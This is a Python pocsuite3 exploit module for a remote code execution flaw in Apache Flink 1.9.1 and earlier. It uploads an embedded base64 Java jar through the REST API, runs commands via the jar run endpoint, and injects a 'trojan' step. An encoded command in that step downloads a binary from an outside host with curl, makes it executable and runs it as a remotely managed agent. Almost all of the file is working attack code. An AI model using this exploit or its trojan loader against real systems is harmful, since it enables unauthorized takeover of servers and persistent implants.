import re
import json
import base64
from collections import OrderedDict
from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, OptString, OptBool


class TestPOC(POCBase):
    vulID = '98107'  # https://www.seebug.org/vuldb/ssvid-98107
    version = '2.0'
    author = 'jstang'
    vulDate = '2019-11-22'
    createData = '2020-11-10'
    updateDate = '2021-01-08'
    references = ['https://twitter.com/pyn3rd/status/1197397475897692160']
    name = 'Apache Flink RCE'
    appPowerLink = 'https://www.apache.org/dyn/closer.lua/flink/flink-1.9.1'
    appName = 'Apache Flink'
    appVersion = '<=1.9.1'
    vulType = 'RCE'
    desc = 'Apache Flink 1.9.1 通过RESTful API达成远程代码执行'
    samples = []
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    cnnvd = ""
    cveID = ""
    rank = "fatal"
    defaultPorts = ["8081"]
    defaultService = ['apache flink', 'flink', 'blackice-icecap?', 'blackice-icecap']

    def _options(self):
        o = OrderedDict()
        o["schema"] = OptString('', description='需要输入协议', require=True)
        o["command"] = OptString('', description='需要输入木马Agent', require=False)
        o["expolit"] = OptBool('', description='是否需要漏洞利用', require=False)
        return o

    def setattr(self):
        self.command = 'uptime'
        self.trojan_cmd = "Y3VybCAtTyBodHRwOi8vMTcyLjMxLjUwLjI0OS90cm9qYW4vdHJvamFuICYmIGNobW9kICt4IHRyb2phbiYmIC4vdHJvamFuIC0tc2VydmVyX21ldGFkYXRhIGlkPTJmYjhlM2RjMTExMDlmZmI1ZThjZGMzZSAtLXNlcnZlcl9tZXRhZGF0YSBtcT0xNzIuMzEuNTAuMjQ5OjYzNzkgLS1zZXJ2ZXJfbmFtZSAyZmI4ZTNkYzExMTA5ZmZiNWU4Y2RjM2UgLS1yZWdpc3RyeV9hZGRyZXNzIDE3Mi4zMS41MC4yNDk6ODUwMA=="
        self.post_data = r'{"entryClass":"Execute","parallelism":null,"programArgs":"\"%s\"","savepointPath":null,"allowNonRestoredState":null}'
        self.upload_jar_name = 'check-execute.jar'
        self.proxies = {'http': None, 'https': None}
        self.default_headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0 Safari/537.36',
        }
        self.post_headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0 Safari/537.36',
            'Content-Type': 'application/json;charset=utf-8'
        }
        self.execute_cmd_url = ""

    def _getattr(self, site, cmd) -> dict:
        return {
            "webshell": {"payload": self.post_data % self.command, "info": "Execute Command({})".format(self.command)},
            "exploit": {
                "payload": "UEsDBBQACAgIACJ1bU8AAAAAAAAAAAAAAAAUAAQATUVUQS1JTkYvTUFOSUZFU1QuTUb+ygAA803My0xLLS7RDUstKs7Mz7NSMNQz4OXyTczM03XOSSwutlJwrUhNLi1J5eXi5QIAUEsHCIiKCL8wAAAALgAAAFBLAwQKAAAIAAAidW1PAAAAAAAAAAAAAAAACQAAAE1FVEEtSU5GL1BLAwQUAAgICAAidW1PAAAAAAAAAAAAAAAADQAAAEV4ZWN1dGUuY2xhc3ONVet2E1UU/k4yyUwmQy+TQlsQBdSStqSxiIotIlAKVkJbSa0G8DKZHpPTJjNhLjTVCvoQ/ugT8MsfqCtx0aUPwEOx3Gdo09KGtUzW7H3O3vvbt7PPzPMXz/4FMIlfdbyDyxo+1XBFx1Vc05HCjIbrks+quKHipobPNMzp0PC5hlsqChpu6+jBvCQLGhal6gsVd3QUsaRjAF9qWJb8K0m+lqQkyd0URbin4r6OkzLoN5J/K8l3Or6HpaKswmZIXhKOCC4zxLOjywzKjLvCGXoLwuHzYb3MvSWrXCOJWXBtq7ZseULud4RKUBU+Q6ow2+R2GPBpEtUt4TAcy94rrFoPrXzNcir5YuAJpzItA7AGw/F9qkXPtbnvXwtFbYV75CDeCDZkuENo8m15FQqX6eKaHLuEtesrtJI2h0NIG7ujCQNRyxdty3GiqPps0+aNQLiOr4J86EU39Gx+Q8gyjZ3yJiTSwLsYYQCD6voTjlXnKriBH1AxUIWgJNaFY2AVawxDr6uToe9gCeSPsp/gTQoYy9syTI5k+bJw8n6VkogAws2/zCkVKcqWX5WWNQN1UNtjOQK6oB73H6pSxQMDHnxpH5Dp/asGQjw0sA7KtwlhYAMjBn7ETwyDB9PrJB7fvLJpYBM/G3gEoeKxgV9Qo0x3mvRKaQvlVW5TsMyeqNPoV3uw4Qe8zpCu8IBa1eCenIKRbJch6nb46cAtuOvcm7F8SmAg29VIs10noOmk8Tix3/FM1fKK/EHIHZtPj95lONotLM1ukjeFH/jRXSGzhB9YXiDNR7tOW/8hIUMP1TfnNMKA3HKLCh7cBdPJ7lMQfCjbVSETMUKfX+c1UReBPJKzr2/TgTFXq5Y/z5uUtOJELGHXXNmyuBvKSjoRF8nJXipJq9HgDl2L3P86kL3LrAXu7nRnurim+A25w2m8Te9G+YvRxaILRvQs7fLE6a4hMdYGexqps0STkZBhlKjx0gBjGCeewjnkyIrAbInskiT7y4wVxuLnb5vxv6G0kDCTLahbOLUNrZT8B6lS3NSLJcVMF0uJc8U2jPknuGAemVK20VMye9voa6F/C6rZK0W7mGFFYswOJtdCRuoHSsMU5Ggbx8zBFoamEsOJFoa3kJb8+BMo4wW5OvEH3tjGyVIbb5pvtXBqnJ5o0cLpFs7s1fohjhCN01+BSvUMEr1AdV6EjptI4xbpOXqxhj66kP34DSb+RCbqzR36WEwScoIaGSdEDu/RXpE9wXm8H/l9St4m5dsMv+MDWsXI28IOYg1zFP8jQjwifhEfU5+nCKWQ/TQ9l6IsP/kPUEsHCEEOnKXWAwAA4gYAAFBLAQIUABQACAgIACJ1bU+Iigi/MAAAAC4AAAAUAAQAAAAAAAAAAAAAAAAAAABNRVRBLUlORi9NQU5JRkVTVC5NRv7KAABQSwECCgAKAAAIAAAidW1PAAAAAAAAAAAAAAAACQAAAAAAAAAAAAAAAAB2AAAATUVUQS1JTkYvUEsBAhQAFAAICAgAInVtT0EOnKXWAwAA4gYAAA0AAAAAAAAAAAAAAAAAnQAAAEV4ZWN1dGUuY2xhc3NQSwUGAAAAAAMAAwC4AAAArgQAAAAA",
                "info": "Upload Jar File"
            },
            # "webshell": {"payload": webshell, "info": "{}/wls-wsat/test.jsp?pwd=023&i=whoami".format(site)},
            "trojan": {"payload": self.post_data % "echo {} | base64 -d | bash".format(cmd), "info": "Inject Trojan"}
        }

    def _attack(self):
        '''attack mode'''
        return self._verify()

    def _verify(self):
        '''verify_mode'''
        result = {}
        # 0.设定类属性值
        self.setattr()

        target = self.parse_target(self.get_option("schema"), 8081)
        print(">>>>>>", target)

        # 1.指定postdata
        postdata = self._getattr(target, self.get_option("command"))

        # 2. 漏洞验证(漏洞利用)
        # 2.1 检查jar路劲是否存在
        url = "{}/jars/".format(target)
        resp = requests.get(url, headers=self.default_headers, verify=False, timeout=30)
        if resp.status_code != 200:
            return result

        result["VerifyInfo"] = {}
        result["VerifyInfo"]["URL"] = url
        result["VerifyInfo"]["PostData"] = ""
        result["VerifyInfo"]["Result"] = "Find Jar Path At URL, Execute Command By Rest API"

        if not self.get_option("expolit"):
            print('仅进行漏洞验证.')
            return self.parse_output(result)

        # 3.漏洞利用
        self.upload_execute_jar(target, self.upload_jar_name, postdata['exploit']['payload'])
        jar_hash_name = self.check_jar_exsits(target, self.upload_jar_name)
        print("jar", jar_hash_name)
        if jar_hash_name:
            self.execute_cmd_url = '{}/jars/{}/run?entry-class=Execute&program-args="{}"'.format(target, jar_hash_name, self.command)
            result["ExploitInfo"] = {}
            result["ExploitInfo"]["URL"] = "{}/jars/upload".format(target)
            result["ExploitInfo"]["PostData"] = postdata['exploit']['payload']
            result["ExploitInfo"]["Result"] = "Upload {} Successfully, Content: ".format(self.upload_jar_name)
        else:
            return self.parse_output(result)

        # 4.漏洞利用(Webshell)
        result["WebshellInfo"] = self.__webshell(postdata['webshell'])
        if 'Failed' in result['WebshellInfo']['Result']:
            return self.parse_output(result)

        # 5. 木马注入,
        result["TrojanInfo"] = self.__trojan_inject(postdata['trojan'])
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def parse_target(self, schema: str, default_port: int) -> str:
        port_pattern = re.compile(':\d+$')
        if not port_pattern.findall(self.target) and 'http' not in schema and default_port:
            return "{}://{}:{}".format(schema, self.target, default_port)
        return "{}://{}".format(schema, self.target)

    def check_jar_exsits(self, site, upload_jar_name):
        list_jar_url = "{}/jars/".format(site)
        response = requests.get(list_jar_url, headers=self.default_headers, verify=False, timeout=30, proxies=self.proxies)
        if response.status_code == 200 and "application/json" in response.headers.get("Content-Type", ""):
            try:
                r = json.loads(response.text)
                for upload_file in r['files']:
                    if str(upload_file['id']).endswith('{}'.format(upload_jar_name)):
                        return upload_file['id']
            except Exception as e:
                print(e)
                return False
        return False

    def upload_execute_jar(self, site, upload_jar_name, file_content):
        upload_jar_url = "{}/jars/upload".format(site)
        print(upload_jar_url)
        file_content = base64.b64decode('UEsDBBQACAgIACJ1bU8AAAAAAAAAAAAAAAAUAAQATUVUQS1JTkYvTUFOSUZFU1QuTUb+ygAA803My0xLLS7RDUstKs7Mz7NSMNQz4OXyTczM03XOSSwutlJwrUhNLi1J5eXi5QIAUEsHCIiKCL8wAAAALgAAAFBLAwQKAAAIAAAidW1PAAAAAAAAAAAAAAAACQAAAE1FVEEtSU5GL1BLAwQUAAgICAAidW1PAAAAAAAAAAAAAAAADQAAAEV4ZWN1dGUuY2xhc3ONVet2E1UU/k4yyUwmQy+TQlsQBdSStqSxiIotIlAKVkJbSa0G8DKZHpPTJjNhLjTVCvoQ/ugT8MsfqCtx0aUPwEOx3Gdo09KGtUzW7H3O3vvbt7PPzPMXz/4FMIlfdbyDyxo+1XBFx1Vc05HCjIbrks+quKHipobPNMzp0PC5hlsqChpu6+jBvCQLGhal6gsVd3QUsaRjAF9qWJb8K0m+lqQkyd0URbin4r6OkzLoN5J/K8l3Or6HpaKswmZIXhKOCC4zxLOjywzKjLvCGXoLwuHzYb3MvSWrXCOJWXBtq7ZseULud4RKUBU+Q6ow2+R2GPBpEtUt4TAcy94rrFoPrXzNcir5YuAJpzItA7AGw/F9qkXPtbnvXwtFbYV75CDeCDZkuENo8m15FQqX6eKaHLuEtesrtJI2h0NIG7ujCQNRyxdty3GiqPps0+aNQLiOr4J86EU39Gx+Q8gyjZ3yJiTSwLsYYQCD6voTjlXnKriBH1AxUIWgJNaFY2AVawxDr6uToe9gCeSPsp/gTQoYy9syTI5k+bJw8n6VkogAws2/zCkVKcqWX5WWNQN1UNtjOQK6oB73H6pSxQMDHnxpH5Dp/asGQjw0sA7KtwlhYAMjBn7ETwyDB9PrJB7fvLJpYBM/G3gEoeKxgV9Qo0x3mvRKaQvlVW5TsMyeqNPoV3uw4Qe8zpCu8IBa1eCenIKRbJch6nb46cAtuOvcm7F8SmAg29VIs10noOmk8Tix3/FM1fKK/EHIHZtPj95lONotLM1ukjeFH/jRXSGzhB9YXiDNR7tOW/8hIUMP1TfnNMKA3HKLCh7cBdPJ7lMQfCjbVSETMUKfX+c1UReBPJKzr2/TgTFXq5Y/z5uUtOJELGHXXNmyuBvKSjoRF8nJXipJq9HgDl2L3P86kL3LrAXu7nRnurim+A25w2m8Te9G+YvRxaILRvQs7fLE6a4hMdYGexqps0STkZBhlKjx0gBjGCeewjnkyIrAbInskiT7y4wVxuLnb5vxv6G0kDCTLahbOLUNrZT8B6lS3NSLJcVMF0uJc8U2jPknuGAemVK20VMye9voa6F/C6rZK0W7mGFFYswOJtdCRuoHSsMU5Ggbx8zBFoamEsOJFoa3kJb8+BMo4wW5OvEH3tjGyVIbb5pvtXBqnJ5o0cLpFs7s1fohjhCN01+BSvUMEr1AdV6EjptI4xbpOXqxhj66kP34DSb+RCbqzR36WEwScoIaGSdEDu/RXpE9wXm8H/l9St4m5dsMv+MDWsXI28IOYg1zFP8jQjwifhEfU5+nCKWQ/TQ9l6IsP/kPUEsHCEEOnKXWAwAA4gYAAFBLAQIUABQACAgIACJ1bU+Iigi/MAAAAC4AAAAUAAQAAAAAAAAAAAAAAAAAAABNRVRBLUlORi9NQU5JRkVTVC5NRv7KAABQSwECCgAKAAAIAAAidW1PAAAAAAAAAAAAAAAACQAAAAAAAAAAAAAAAAB2AAAATUVUQS1JTkYvUEsBAhQAFAAICAgAInVtT0EOnKXWAwAA4gYAAA0AAAAAAAAAAAAAAAAAnQAAAEV4ZWN1dGUuY2xhc3NQSwUGAAAAAAMAAwC4AAAArgQAAAAA')
        # print(file_content)
        # file_content = file_content.encode('utf-8')
        # file_content = base64.b64decode(file_content)
        # print(type(str(file_content)))
        files = {'jarfile': (upload_jar_name, file_content, 'application/octet-stream')}
        try:
            requests.post(upload_jar_url, headers=self.default_headers, files=files, timeout=30, verify=False, proxies=self.proxies)
        except Exception as e:
            print("eeeeeeeee", e)
            return False
        print("upload_execute_jar")
        return True

    def __trojan_inject(self, postdata):
        result = {
            'URL': self.execute_cmd_url,
            'PostData': base64.b64encode(postdata['payload'].encode('utf-8')).decode('utf-8'),
            'Result': postdata['info'] + " Successfully"
        }
        try:
            requests.post(self.execute_cmd_url, headers=self.post_headers, data=postdata["payload"], verify=False, timeout=20, proxies=self.proxies)
        except Exception as e:
            result['Result'] = postdata['info'] + " Failed, info: {}".format(e)
            return result
        return result

    def __webshell(self, postdata):
        result = {
            'URL': self.execute_cmd_url,
            'PostData': base64.b64encode(postdata['payload'].encode('utf-8')).decode('utf-8'),
            'Result': "Exec Command Failed"
        }
        try:
            r1 = requests.post(self.execute_cmd_url, headers=self.post_headers, data=postdata['payload'], verify=False, timeout=20, proxies=self.proxies)
        except requests.exceptions.ReadTimeout as e:
            result['Result'] += ", info: [execute timeout]{}".format(e)
            return result

        match = re.findall('\|@\|(.*?)\|@\|', r1.text)
        if not match:
            return result
        data = match[0][:-2] if match[0][:-2] else "[result is blank]"
        result['Result'] = "Exec Command Successfully, got data: {}".format(data)
        return result


register_poc(TestPOC)
